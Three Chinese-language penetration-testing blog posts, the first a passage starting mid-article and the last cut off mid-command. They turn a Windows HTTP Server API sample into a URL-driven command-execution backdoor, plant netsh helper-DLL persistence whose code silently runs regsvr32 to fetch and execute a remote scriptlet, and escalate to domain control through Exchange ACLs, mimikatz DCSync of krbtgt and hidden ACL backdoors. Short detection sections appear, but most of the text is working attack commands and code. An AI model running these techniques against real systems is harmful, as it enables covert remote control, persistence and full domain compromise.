<h3 id="1示例代码测试">1.示例代码测试</h3>

<p>下载地址：</p>

<p>https://docs.microsoft.com/en-us/windows/win32/http/http-server-sample-application</p>

<p>代码支持同时注册多个URL，处理请求，发送HTTP响应</p>

<p>简单测试如下：</p>

<p>服务器IP为192.168.112.129</p>

<p>管理员权限执行：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http-server-sample-application.exe http://+:80/MyUri1 http://+:80/MyUri2
</code></pre></div></div>

<p>打开浏览器分别访问http://192.168.112.129:80/MyUri1和http://192.168.112.129:80/MyUri2</p>

<p>接收的结果如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-8-6/3-1.png" alt="Alt text"></p>

<p>示例代码通过API HttpAddUrl()将URL注册为Listen On，默认配置下，需要管理员权限才能添加成功，否则产生错误：HttpAddUrl failed with 5，提示权限不够</p>

<p>但可以通过添加url acl(需要管理员权限)的方式实现普通用户权限下的正常运行</p>

<h3 id="2通过添加url-acl需要管理员权限的方式实现示例代码以普通用户权限运行">2.通过添加url acl(需要管理员权限)的方式实现示例代码以普通用户权限运行</h3>

<p>方法如下:</p>

<p>添加url acl，授予Everyone用户对指定URL的权限，命令如下(管理员权限):</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>netsh http add urlacl url=http://+:80/MyUri user=everyone
</code></pre></div></div>

<p><strong>注：</strong></p>

<p>删除该url acl的命令如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>netsh http delete urlacl url=http://+:80/MyUri
</code></pre></div></div>

<p>再次执行测试程序(普通用户权限)，命令如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http-server-sample-application.exe http://+:80/MyUri
</code></pre></div></div>

<p>执行成功</p>

<h3 id="3借助已有的url-acl实现示例代码以普通用户权限运行">3.借助已有的url acl实现示例代码以普通用户权限运行</h3>

<p>列出所有URL的DACL，命令如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>netsh http show urlacl
</code></pre></div></div>

<p>注意到默认配置下包含以下acl：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> Reserved URL            : http://+:80/Temporary_Listen_Addresses/
       User: \Everyone
           Listen: Yes
           Delegate: No
           SDDL: D:(A;;GX;;;WD)
</code></pre></div></div>

<p>User为Everyone，所以我们可以借助这个url</p>

<p>执行示例程序(普通用户权限)，命令如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http-server-sample-application.exe http://+:80/Temporary_Listen_Addresses/MyUri
</code></pre></div></div>

<p>执行成功</p>

<h3 id="4修改示例代码实现命令执行">4.修改示例代码，实现命令执行</h3>

<p>思路如下：</p>

<p>通过GET请求发送要执行的cmd命令，格式为<code class="language-plaintext highlighter-rouge">?&lt;command&gt;</code></p>

<p>例如:http://192.168.112.129/MyUri?whoami，要执行的命令为whoami，在Response中回复执行的结果</p>

<p>对于不符合格式的GET和POST请求，在Response中回复404</p>

<p>实现代码：</p>

<p>以示例程序为模板，需要修改以下位置：</p>

<h4 id="1使用传入参数">(1)使用?传入参数</h4>

<p><code class="language-plaintext highlighter-rouge">pRequest-&gt;CookedUrl.pQueryString</code>能够读取参数，但包括了无用的字符<code class="language-plaintext highlighter-rouge">?</code>，实际执行命令时需要去掉<code class="language-plaintext highlighter-rouge">pRequest-&gt;CookedUrl.pQueryString</code>的第一个字符</p>

<p>去掉pRequest-&gt;CookedUrl.pQueryString第一个字符的C代码如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>WCHAR *QueryString = new WCHAR[pRequest-&gt;CookedUrl.QueryStringLength-1];
wcsncpy_s(QueryString, wcslen(QueryString), pRequest-&gt;CookedUrl.pQueryString + 1, wcslen(QueryString) - 1);
wprintf_s(L"%s\n", QueryString);
</code></pre></div></div>

<h4 id="2特殊字符的替换">(2)特殊字符的替换</h4>

<ul>
  <li>空格被转码为%20</li>
  <li>“被转码为%22</li>
  <li>‘被转码为%27</li>
</ul>

<p>例如浏览器输入字符串<code class="language-plaintext highlighter-rouge">whoami /all</code>，会被转码为<code class="language-plaintext highlighter-rouge">whoami%20/all</code>，这条命令无法直接在命令行下执行</p>

<p>还原URL编码的C代码已上传至github，地址如下：</p>

<p>https://github.com/3gstudent/Homework-of-C-Language/blob/master/UrlDecode.cpp</p>

<p>代码支持多字节字符集和Unicode字符集</p>

<h4 id="3使用管道读入命令并执行回传结果">(3)使用管道读入命令并执行，回传结果</h4>

<p>使用管道执行cmd命令并获取结果的代码已上传至github，地址如下：</p>

<p>https://github.com/3gstudent/Homework-of-C-Language/blob/master/UsePipeToExeCmd.cpp</p>

<h4 id="4修改回传结果的格式">(4)修改回传结果的格式</h4>

<p>回传的结果需要作格式转换，<code class="language-plaintext highlighter-rouge">\n</code>换行符转换成html中的<code class="language-plaintext highlighter-rouge">&lt;/br&gt;</code>，否则浏览器显示的内容无法换行</p>

<p>将文本中的换行符(<code class="language-plaintext highlighter-rouge">\n</code>)转换成html中换行符(<code class="language-plaintext highlighter-rouge">&lt;/br&gt;</code>)的代码已上传至github，地址如下：</p>

<p>https://github.com/3gstudent/Homework-of-C-Language/blob/master/TextToHtmlofNewline.cpp</p>

<p>最终实现的代码已上传至github，地址如下：</p>

<p>https://github.com/3gstudent/Homework-of-C-Language/blob/master/HTTPServerWebshell.cpp</p>

<p>只有输入特定格式的url能够执行命令，否则提示404</p>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-8-6/2-1.png" alt="Alt text"></p>

<p>命令实例：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://192.168.112.129/MyUri?net%20start
</code></pre></div></div>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-8-6/2-2.png" alt="Alt text"></p>

<p>https协议也支持，命令实例：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://192.168.112.129/MyUri?net%20start
</code></pre></div></div>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-8-6/2-3.png" alt="Alt text"></p>

<h2 id="0x05-利用方法">0x05 利用方法</h2>
<hr>

<p>Windows服务器开启了IIS服务，防火墙仅允许80或443端口进行通信，在不使用webshell的前提下，实现对该服务器远程管理的方法如下：</p>

<h3 id="1使用管理员权限">1.使用管理员权限</h3>

<h4 id="1使用winrm服务">(1)使用WinRM服务</h4>

<p>需要开启WinRM服务</p>

<p>需要Administrators组中的帐户口令或hash</p>

<h4 id="2使用http-server-api">(2)使用HTTP Server API</h4>

<p>可以使用任意url</p>

<p><strong>注：</strong></p>

<p>80和443端口都可以</p>

<h3 id="2使用普通用户权限">2.使用普通用户权限</h3>

<h4 id="1使用http-server-api">(1)使用HTTP Server API</h4>

<p>使用已有的url acl：http://+:80/Temporary_Listen_Addresses/</p>

<p><strong>注：</strong></p>

<p>无法使用443端口</p>

<h2 id="0x06-检测方法">0x06 检测方法</h2>
<hr>

<p>使用以下方法检测当前IIS服务器的端口共享功能是否被滥用</p>

<h3 id="1检测正在使用的url">1.检测正在使用的url</h3>

<p>如果使用了HTTP Server API，程序在运行时会注册url，查看命令如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>netsh http sh ser
</code></pre></div></div>

<p>可疑结果示例：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Server session ID: D000000020000174
    Version: 1.0
    State: Active
    Properties:
        Max bandwidth: 4294967295
        Timeouts:
            Entity body timeout (secs): 120
            Drain entity body timeout (secs): 120
            Request queue timeout (secs): 120
            Idle connection timeout (secs): 120
            Header wait timeout (secs): 120
            Minimum send rate (bytes/sec): 150
    URL groups:
    URL group ID: AC0000004000017C
        State: Active
        Request queue name: Request queue is unnamed.
        Properties:
            Max bandwidth: inherited
            Max connections: inherited
            Timeouts:
                Timeout values inherited
            Number of registered URLs: 1
            Registered URLs:
                HTTP://192.168.112.129:80:192.168.112.129/MYURI/

Server session ID: D000000020000173
    Version: 1.0
    State: Active
    Properties:
        Max bandwidth: 4294967295
        Timeouts:
            Entity body timeout (secs): 120
            Drain entity body timeout (secs): 120
            Request queue timeout (secs): 120
            Idle connection timeout (secs): 120
            Header wait timeout (secs): 120
            Minimum send rate (bytes/sec): 150
    URL groups:
    URL group ID: AC0000004000017B
        State: Active
        Request queue name: Request queue is unnamed.
        Properties:
            Max bandwidth: inherited
            Max connections: inherited
            Timeouts:
                Timeout values inherited
            Number of registered URLs: 1
            Registered URLs:
                HTTPS://192.168.112.129:443:192.168.112.129/MYURI/
                
Server session ID: D600000020000077
    Version: 1.0
    State: Active
    Properties:
        Max bandwidth: 4294967295
        Timeouts:
            Entity body timeout (secs): 120
            Drain entity body timeout (secs): 120
            Request queue timeout (secs): 120
            Idle connection timeout (secs): 120
            Header wait timeout (secs): 120
            Minimum send rate (bytes/sec): 150
    URL groups:
    URL group ID: BF00000040000120
        State: Active
        Request queue name: Request queue is unnamed.
        Properties:
            Max bandwidth: inherited
            Max connections: inherited
            Timeouts:
                Timeout values inherited
            Number of registered URLs: 1
            Registered URLs:
                HTTP://+:80/TEMPORARY_LISTEN_ADDRESSES/
</code></pre></div></div>

<h3 id="2查看winrm服务配置">2.查看WinRM服务配置</h3>

<p>如果攻击者获得了管理员权限，WinRM服务配置有可能被滥用</p>

<p>查看监听配置：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>winrm e winrm/config/listener
</code></pre></div></div>

<p>查看是否开启可疑端口</p>

<h2 id="0x07-小结">0x07 小结</h2>
<hr>

<p>本文解决了如下问题：</p>

<p>Windows服务器开启了IIS服务，防火墙仅允许80或443端口进行通信，那么如何在不使用webshell，并且只有普通用户权限，实现对该服务器的远程管理？</p>

<p>解决方法:</p>

<p>使用代码：</p>

<p>https://github.com/3gstudent/Homework-of-C-Language/blob/master/HTTPServerWebshell.cpp</p>

<p>使用已有的url acl，命令参数如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>HTTPServerWebshell.exe http://+:80/Temporary_Listen_Addresses/
</code></pre></div></div>

<hr>

<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>


  </div>

  <div class="date">
    Written on August  6, 2019
  </div>

  
</article><article class="post">
  <h1>Netsh persistence</h1>

  <div class="entry">
    <p><strong>About:</strong></p>

<ul>
  <li>Common commands of netsh</li>
  <li>Matthew Demaske’s way of using netshell to execute evil dlls and persist on a host</li>
  <li>Write a dll with the InitHelperDll function</li>
  <li>How to use</li>
  <li>Detection</li>
</ul>

<p><strong>目录：</strong></p>

<ul>
  <li>介绍netsh的常用命令</li>
  <li>测试Matthew Demaske分享的方法——using netshell to execute evil dlls and persist on a host</li>
  <li>如何使用c++编写导出函数为InitHelperDll的helper dll</li>
  <li>实际测试利用</li>
  <li>防御和检测</li>
</ul>

<p><strong>Reference:</strong></p>

<p>http://www.adaptforward.com/2016/09/using-netshell-to-execute-evil-dlls-and-persist-on-a-host/</p>

<h2 id="0x00-简介">0x00 简介</h2>
<hr>
<p>在渗透测试中，使用系统中默认支持的命令常常可以绕过各种检测和拦截，比如我在《Use bitsadmin to maintain persistence and bypass Autoruns》中介绍过如何利用系统默认支持的bitsadmin来实现自启动，并绕过Autoruns的检测。</p>

<p>Matthew Demaske在最近分享了一个他发现的方法，同样是利用系统中默认支持的命令——using netshell to execute evil dlls and persist on a host，本文将对其方法进行整理，并补全文中未具体介绍的dll编写方法</p>

<h2 id="0x01-netsh简介">0x01 netsh简介</h2>
<hr>
<p>是windows系统本身提供的功能强大的网络配置命令行工具，常用命令如下：</p>

<p>查看ip配置信息：
<code class="language-plaintext highlighter-rouge">netsh interface ip show config</code></p>

<p>查看网络配置文件：
<code class="language-plaintext highlighter-rouge">netsh -c interface dump</code></p>

<p>开/关网卡：
<code class="language-plaintext highlighter-rouge">netsh int set int name="ethernet" admin=enabled</code>
<code class="language-plaintext highlighter-rouge">netsh int set int name="ethernet" admin=disabled</code></p>

<p>查看所有tcp连接：
<code class="language-plaintext highlighter-rouge">netsh interface ip show tcpconnections</code></p>

<p>设置本机ip、子网掩码、网关ip：
<code class="language-plaintext highlighter-rouge">netsh interface ip set address "Local Area Connection" static 192.168.1.2 255.255.255.0 192.168.1.1</code></p>

<p>查看防火墙状态：
<code class="language-plaintext highlighter-rouge">netsh firewall show state</code></p>

<p>开/关防火墙：</p>

<p><code class="language-plaintext highlighter-rouge">netsh firewall set opmode enable</code></p>

<p><code class="language-plaintext highlighter-rouge">netsh firewall set opmode disable</code></p>

<p>输入netsh /?可查看更详细的命令帮助，其中add命令值得注意，输入netsh add /?获得更详细内容：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>netsh add /?
The following commands are available:
Commands in this context:
add helper - Installs a helper DLL.
</code></pre></div></div>

<p>如果在此添加一个测试dll，结果会怎样呢？</p>

<h2 id="0x02-编写helper-dll">0x02 编写helper DLL</h2>
<hr>
<p>每个helper DLL都需要包含导出函数InitHelperDll</p>

<p>在添加helper DLL后，每次netsh在初始加载的时候会调用该helper DLL中的导出函数InitHelperDll</p>

<p>InitHelperDll示例如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>DWORD
WINAPI
InitHelperDll(
    DWORD      dwNetshVersion,
    PVOID      pReserved
)
{
    NS_HELPER_ATTRIBUTES attMyAttributes;

    attMyAttributes.guidHelper = g_MyGuid;
    attMyAttributes.dwVersion  = 1;
    attMyAttributes.pfnStart   = NetshStartHelper;
    RegisterHelper( NULL, &amp;attMyAttributes );
    return NO_ERROR;
}
</code></pre></div></div>

<p>关于InitHelperDll的细节可参照如下链接：</p>

<p>https://msdn.microsoft.com/en-us/library/windows/desktop/ms708327(v=vs.85).aspx</p>

<p>在《Code Execution of Regsvr32.exe》曾具体介绍过如何为dll添加一个导出函数，所以在这里接着简单介绍一下：</p>

<p>新建c++工程，创建一个dll项目 在主文件添加:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>DWORD WINAPI InitHelperDll(DWORD dwNetshVersion,PVOID pReserved)
{
	char *command="cmd.exe /c start regsvr32.exe /s /n /u /i:https://raw.githubusercontent.com/3gstudent/SCTPersistence/master/calc.sct scrobj.dll";
    WinExec(command,SW_HIDE); 
	return 0;
}
</code></pre></div></div>

<p>添加导出函数声明:</p>

<p>文件类型：</p>

<p>Text File</p>

<p>名称：</p>

<p>同名文件.def</p>

<p>写入</p>

<p>EXPORTS
InitHelperDll</p>

<p>编译即可</p>

<p><strong>注：</strong></p>

<p>Marc Smeets分享了他的POC代码，定义导出函数使用的是另一种方式:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>extern "C" __declspec(dllexport) DWORD InitHelperDll(DWORD dwNetshVersion, PVOID pReserved)
</code></pre></div></div>

<p>payload为创建新线程执行shellcode</p>

<p><strong>项目地址如下：</strong></p>

<p>https://github.com/outflankbv/NetshHelperBeacon</p>

<h2 id="0x03-添加自定义helper-dll">0x03 添加自定义helper dll</h2>
<hr>
<p><strong>注：</strong></p>

<p>需要管理员权限</p>

<p>通过cmd添加:</p>

<p><code class="language-plaintext highlighter-rouge">netsh add helper c:\test\netshtest.dll</code></p>

<p>如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-9-29/2-1.png" alt="Alt text"></p>

<p>如下图，注册表同步创建键值</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-9-29/2-2.png" alt="Alt text"></p>

<p>位置：<code class="language-plaintext highlighter-rouge">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NetSh</code></p>

<p>名称：<code class="language-plaintext highlighter-rouge">netshtest</code></p>

<p>类型：<code class="language-plaintext highlighter-rouge">REG_SZ</code></p>

<p>数据：<code class="language-plaintext highlighter-rouge">c:\test\netshtest.dll</code></p>

<p><strong>注：</strong></p>

<p>通过注册表直接添加键值同netsh add 添加helper dll的作用一样</p>

<h2 id="0x04-触发后门">0x04 触发后门</h2>
<hr>
<p>helper dll添加成功后，每次调用netsh，均会加载c:\test\netshtest.dll</p>

<p>如图，运行netsh命令，加载c:\test\netshtest.dll，弹出计算器</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-9-29/2-3.png" alt="Alt text"></p>

<p>验证：</p>

<ul>
  <li>使用Process Explorer查看netsh进程加载的dll</li>
</ul>

<p>如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-9-29/3-1.png" alt="Alt text"></p>

<ul>
  <li>使用Process Monitor在进程属性Event Properties也可以查看</li>
</ul>

<p>如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-9-29/3-2.png" alt="Alt text"></p>

<h2 id="0x05-persistence">0x05 Persistence</h2>
<hr>

<ul>
  <li>
    <p>netsh作为系统常用命令，存在被用户正常使用的概率，所以只要启动netsh即可触发payload</p>
  </li>
  <li>
    <p>如果被添加为常用的开机启动项，也很有迷惑性，因为显示的仅仅是启动netsh.exe</p>
  </li>
</ul>

<h2 id="0x06-检测">0x06 检测</h2>
<hr>

<p>监控注册表位置<code class="language-plaintext highlighter-rouge">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NetSh</code></p>

<p><strong>注：</strong></p>

<ul>
  <li>
    <p>netsh show helper命令并不能查到新添加的helper dll</p>
  </li>
  <li>
    <p>需要留意注册表内正常的dll是否被替换</p>
  </li>
</ul>

<h2 id="0x07-清除">0x07 清除</h2>
<hr>

<p>通过cmd:</p>

<p><code class="language-plaintext highlighter-rouge">netsh delete helper c:\test\netshtest.dll</code></p>

<p>通过注册表:</p>

<p><code class="language-plaintext highlighter-rouge">在HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NetSh删除对应键值</code></p>

<h2 id="0x08-小结">0x08 小结</h2>
<hr>

<ul>
  <li>
    <p>Netsh Persistence实现的前提是已经获得了管理员权限</p>
  </li>
  <li>
    <p>部分vpn软件在启动过程中会调用netsh命令，这样就解决了Netsh Persistence的自启动问题，该方法值得测试</p>
  </li>
  <li>
    <p>如果在开机启动项中发现有netsh，值得留意，需要查看对应注册表键值中是否包含恶意的helper dll</p>
  </li>
  <li>
    <p>不同系统中注册表HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NetSh下的默认键值存在差异，需要对比查找默认键值是否被篡改</p>
  </li>
</ul>

<hr>

<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>

  </div>

  <div class="date">
    Written on September 29, 2016
  </div>

  
</article><article class="post">
  <h1>域渗透——使用Exchange服务器中特定的ACL实现域提权</h1>

  <div class="entry">
    <h2 id="0x00">0x00</h2>
<hr>

<p>最近学到的一个域环境下的提权技巧，在域环境中，安装Exchange后会添加一个名为<code class="language-plaintext highlighter-rouge">Microsoft Exchange Security Groups</code>的OU，其中包括两个特殊的组：<code class="language-plaintext highlighter-rouge">Exchange Trusted Subsystem</code>和<code class="language-plaintext highlighter-rouge">Exchange Windows Permission</code>，如果获得了这两个组内任意用户的控制权限，就能够继承该组的WriteDACL权限，进而修改域对象的ACL，最终实现利用DCSync导出域内所有用户hash。接下来可以使用域用户krbtgt的hash制作Golden Ticket，登录域控制器，获得对整个域的控制权限。</p>

<p>学习资料：</p>

<p>https://github.com/gdedrouas/Exchange-AD-Privesc</p>

<p>本文将会记录复现过程，介绍利用这个机制建立提权后门的方法，详细介绍使用PowerView对域对象ACL的操作方法，最后给出检测和防御建议。</p>

<h2 id="0x01-简介">0x01 简介</h2>
<hr>

<p>本文将要介绍以下内容：</p>

<ul>
  <li>提权方法复现</li>
  <li>建立提权后门的方法</li>
  <li>检测和防御建议</li>
</ul>

<h2 id="0x02-提权方法复现">0x02 提权方法复现</h2>
<hr>

<p>测试环境：</p>

<ul>
  <li>Server2012R2 x64</li>
  <li>Exchange 2013</li>
</ul>

<h3 id="前置知识">前置知识</h3>

<h4 id="1常用缩写词">1.常用缩写词</h4>

<ul>
  <li>DN:Distinguished Name</li>
  <li>CN:Common Name</li>
  <li>OU:Organizational Unit</li>
  <li>DC:Domain Component</li>
  <li>ACE:Access Control Entries</li>
  <li>ACL:Access Control List</li>
</ul>

<p>LDAP连接服务器的连接字串格式为：ldap://servername/DN</p>

<p>其中DN有三个属性，分别是CN、OU和DC</p>

<h4 id="2安装exchange后默认会自动添加一个名为microsoft-exchange-security-groups的ou">2.安装Exchange后默认会自动添加一个名为Microsoft Exchange Security Groups的OU</h4>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-9-22/2-1.png" alt="Alt text"></p>

<p>其中包括两个特殊的组：<code class="language-plaintext highlighter-rouge">Exchange Trusted Subsystem</code>和<code class="language-plaintext highlighter-rouge">Exchange Windows Permission</code></p>

<p><code class="language-plaintext highlighter-rouge">Exchange Trusted Subsystem</code>是<code class="language-plaintext highlighter-rouge">Exchange Windows Permission</code>的成员</p>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-9-22/2-2.png" alt="Alt text"></p>

<p>默认情况下，<code class="language-plaintext highlighter-rouge">Exchange Windows Permissions</code>对安装Exchange的域对象具有WriteDACL权限，那么<code class="language-plaintext highlighter-rouge">Exchange Trusted Subsystem</code>也会继承这个权限</p>

<h4 id="3如果对域对象具有writedacl权限就能够为指定域用户添加ace使其获得利用dcsync导出域内所有用户hash的权限接下来可以使用域用户krbtgt的hash制作golden-ticket登录域控制器获得对整个域的控制权限">3.如果对域对象具有WriteDACL权限，就能够为指定域用户添加ACE，使其获得利用DCSync导出域内所有用户hash的权限，接下来可以使用域用户krbtgt的hash制作Golden Ticket，登录域控制器，获得对整个域的控制权限</h4>

<p>详细利用方法可参考之前的文章：<a href="https://3gstudent.github.io/3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-DCSync/">《域渗透——DCSync》</a></p>

<h4 id="4使用powerview能够对域对象的acl进行操作">4.使用PowerView能够对域对象的ACL进行操作</h4>

<p>值得注意的是PowerView存在两个版本，有些功能只在dev版本中支持，两个版本的地址分别为：</p>

<p>https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1</p>

<p>https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1</p>

<p>这个细节在之前的文章<a href="https://3gstudent.github.io/3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-AdminSDHolder/">《域渗透——AdminSDHolder》</a>有过介绍</p>

<h3 id="实际测试">实际测试</h3>

<p>这里以<code class="language-plaintext highlighter-rouge">Exchange Trusted Subsystem</code>作为测试对象，测试用户testa的口令已经获得，先将测试用户testa添加到<code class="language-plaintext highlighter-rouge">Exchange Trusted Subsystem</code>中</p>

<p>Powershell命令如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Import-Module ActiveDirectory
Add-ADGroupMember -Identity "Exchange Trusted Subsystem" -Members testa
</code></pre></div></div>

<p>对于未安装Active Directory模块的Windows系统，可以通过如下命令导入Active Directory模块：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>import-module .\Microsoft.ActiveDirectory.Management.dll
Add-ADGroupMember -Identity "Exchange Trusted Subsystem" -Members testa
</code></pre></div></div>

<p><code class="language-plaintext highlighter-rouge">Microsoft.ActiveDirectory.Management.dll</code>在安装powershell模块Active Directory后生成，我已经提取出来并上传至github：</p>

<p>https://github.com/3gstudent/test/blob/master/Microsoft.ActiveDirectory.Management.dll</p>

<p>添加成功后如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-9-22/3-1.png" alt="Alt text"></p>

<p>接下来，在另一台域内主机上完成所有提权的操作</p>

<h4 id="1登录用户testa">1.登录用户testa</h4>

<p>cmd：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>runas /user:test\testa cmd
</code></pre></div></div>

<p>如果在测试过程中，第一次将测试用户testa添加到<code class="language-plaintext highlighter-rouge">Exchange Trusted Subsystem</code>中，那么用户testa需要重新登录才能继承WriteDACL权限</p>

<p>查看用户testa所在的组：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>whoami /groups
</code></pre></div></div>

<p>发现用户testa成功加入<code class="language-plaintext highlighter-rouge">Exchange Trusted Subsystem</code>组，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-9-22/3-2.png" alt="Alt text"></p>

<h4 id="2使用mimikatz的dcsync功能导出用户krbtgt的hash">2.使用mimikatz的DCSync功能导出用户krbtgt的hash</h4>

<p>cmd：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mimikatz.exe privilege::debug "lsadump::dcsync /domain:test.com /user:krbtgt /csv" exit
</code></pre></div></div>

<p>成功导出用户krbtgt的hash，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-9-22/3-3.png" alt="Alt text"></p>

<p>接下来可以使用域用户krbtgt的hash制作Golden Ticket，登录域控制器，获得对整个域的控制权限</p>

<p>提权成功</p>

<p>经过多次测试，得出以下结论：</p>

<p>如果获得了以下三个组内任意用户的权限，都能够利用DCSync导出域内所有用户hash</p>

<p>组名如下：</p>

<ul>
  <li>Exchange Trusted Subsystem</li>
  <li>Exchange Windows Permission</li>
  <li>Organization Management</li>
</ul>

<h2 id="0x03-建立提权后门的方法">0x03 建立提权后门的方法</h2>
<hr>

<p>如果获得了整个域的控制权限，可以利用Exchange中的ACL作为域提权的后门</p>

<h3 id="方法1直接在exchange的三个组内添加后门用户">方法1：直接在Exchange的三个组内添加后门用户</h3>

<p>这里以<code class="language-plaintext highlighter-rouge">Exchange Trusted Subsystem</code>为例</p>

<p>Powershell命令如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Import-Module ActiveDirectory
Add-ADGroupMember -Identity "Exchange Trusted Subsystem" -Members testa
</code></pre></div></div>

<p>但是不够隐蔽，很容易被发现添加的用户</p>

<p>查看的命令如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>net group "Exchange Trusted Subsystem" /domain
</code></pre></div></div>

<h3 id="方法2只添加特定用户对exchange中三个组acl的控制权限">方法2：只添加特定用户对Exchange中三个组ACL的控制权限</h3>

<p>这里以<code class="language-plaintext highlighter-rouge">Exchange Trusted Subsystem</code>为例</p>

<h4 id="1首先需要找到exchange-trusted-subsystem的dndistinguished-name">1.首先需要找到Exchange Trusted Subsystem的DN(Distinguished Name)</h4>

<p>需要使用Powerview的dev版本，地址如下：</p>

<p>https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1</p>

<p>查看所有DN的Powershell命令如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Import-Module .\PowerView.ps1
Get-DomainObject -Properties distinguishedname |fl
</code></pre></div></div>

<p>找到<code class="language-plaintext highlighter-rouge">Exchange Trusted Subsystem</code>的DN为：<code class="language-plaintext highlighter-rouge">CN=Exchange Trusted Subsystem,OU=Microsoft Exchange Security Groups,DC=test,DC=com</code></p>

<h4 id="2查看exchange-trusted-subsystem的acl">2.查看Exchange Trusted Subsystem的ACL</h4>

<p>Powershell命令如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Get-DomainObjectAcl -SearchBase "LDAP://CN=Exchange Trusted Subsystem,OU=Microsoft Exchange Security Groups,DC=test,DC=com"
</code></pre></div></div>

<h4 id="3获得exchange-trusted-subsystem的原始数据">3.获得Exchange Trusted Subsystem的原始数据</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$RawObject = Get-DomainObject -SearchBase "LDAP://CN=Exchange Trusted Subsystem,OU=Microsoft Exchange Security Groups,DC=test,DC=com" -Raw
</code></pre></div></div>

<h4 id="4添加后门用户testb对exchange-trusted-subsystem的完全访问权限">4.添加后门用户testb对Exchange Trusted Subsystem的完全访问权限</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$RawObject = Get-DomainObject -SearchBase "LDAP://CN=Exchange Trusted Subsystem,OU=Microsoft Exchange Security Groups,DC=test,DC=com" -Raw
$TargetObject = $RawObject.GetDirectoryEntry()
$ACE = New-ADObjectAccessControlEntry -InheritanceType All -AccessControlType Allow -PrincipalIdentity testb -Right AccessSystemSecurity,CreateChild,Delete,DeleteChild,DeleteTree,ExtendedRight,GenericAll,GenericExecute,GenericRead,GenericWrite,ListChildren,ListObject,ReadControl,ReadProperty,Self,Synchronize,WriteDacl,WriteOwner,WriteProperty
$TargetObject.PsBase.ObjectSecurity.AddAccessRule($ACE)
$TargetObject.PsBase.CommitChanges()
</code></pre></div></div>

<p><strong>补充：</strong></p>

<p>移除后门用户testb对<code class="language-plaintext highlighter-rouge">Exchange Trusted Subsystem</code>的完全访问权限：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$RawObject = Get-DomainObject -SearchBase "LDAP://CN=Exchange Trusted Subsystem,OU=Microsoft Exchange Security Groups,DC=test,DC=com" -Raw
$TargetObject = $RawObject.GetDirectoryEntry()
